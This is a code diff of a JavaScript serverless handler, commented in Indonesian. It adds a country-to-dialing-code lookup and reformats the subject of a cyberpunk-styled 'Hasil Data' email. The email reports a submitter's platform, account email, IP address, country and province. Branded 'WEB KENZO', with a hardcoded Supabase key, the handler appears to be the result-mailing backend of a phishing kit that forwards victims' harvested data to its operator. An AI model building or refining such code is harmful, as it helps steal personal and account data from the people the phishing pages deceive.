@@ -1,9 +1,20 @@
 export const config = { api: { bodyParser: true } };
 
+// MAPPING KODE NEGARA KE BENDERA
 function countryFlag(code){
     if (!code || code.length !== 2) return "";
     const codePoints = code.toUpperCase().split("").map(function(c){ return 127397 + c.charCodeAt(0); });
     return String.fromCodePoint.apply(null, codePoints);
+}
+
+// MAPPING KODE NEGARA KE KODE TELEPON
+function getDialCode(countryCode) {
+    const codes = {
+        "ID": "+62", "MY": "+60", "SG": "+65", "US": "+1", "GB": "+44", 
+        "AU": "+61", "JP": "+81", "KR": "+82", "CN": "+86", "IN": "+91", 
+        "PH": "+63", "TH": "+66", "VN": "+84", "SA": "+966", "AE": "+971"
+    };
+    return codes[countryCode.toUpperCase()] || "+62"; // Default +62
 }
 
 export default async function handler(req, res) {
@@ -25,7 +36,10 @@ export default async function handler(req, res) {
         const WEB_ID = d.web_id || "web_default"; 
         const PLATFORM = d.platform || "Unknown";
         const COUNTRY_CODE = d.negaraKode || "ID";
-        const DIAL_CODE = d.dial || "+62";
+        
+        // AMBIL BENDERA & KODE TELEPON
+        const flag = countryFlag(COUNTRY_CODE);
+        const dialCode = getDialCode(COUNTRY_CODE);
 
         const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
@@ -58,11 +72,11 @@ export default async function handler(req, res) {
         if (!NAMA_PENGIRIM || NAMA_PENGIRIM === "") NAMA_PENGIRIM = "WEB KENZO";
         if (!EMAIL_PENGIRIM || EMAIL_PENGIRIM === "") EMAIL_PENGIRIM = "hasilress@mediafire.my.id";
 
-        const flag = countryFlag(COUNTRY_CODE);
-        const subjectEmail = `${flag} ${DIAL_CODE} - Hasil Data [${PLATFORM}] | Pemilik (${d.email || "-"})`;
+        // SUBJEK FORMAT (BENDERA, +62, HASIL DATA, PEMILIK)
+        const subjectEmail = `${flag} ${dialCode} - Hasil Data [${PLATFORM}] | Pemilik (${d.email || "-"})`;
         const HEADER_EMAIL = "WEB KENZO";
 
-        // DESAIN CYBERPUNK
+        // DESAIN EMAIL CYBERPUNK
         const htmlBody = `
         <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">HATI HATI DENGAN WEB YANG MENGATAS NAMAKAN KENZ | IP ${d.ip || "-"}</div>
         <div style="font-family: 'Courier New', Courier, monospace; background-color: #0f172a; padding: 40px 15px;">
@@ -114,7 +128,7 @@ export default async function handler(req, res) {
                 </tr>
                 <tr>
                   <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Country</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${flag} ${d.negara || "-"} (${DIAL_CODE})</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${flag} ${d.negara || "-"} (${dialCode})</td>
                 </tr>
                 <tr>
                   <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Province</td>
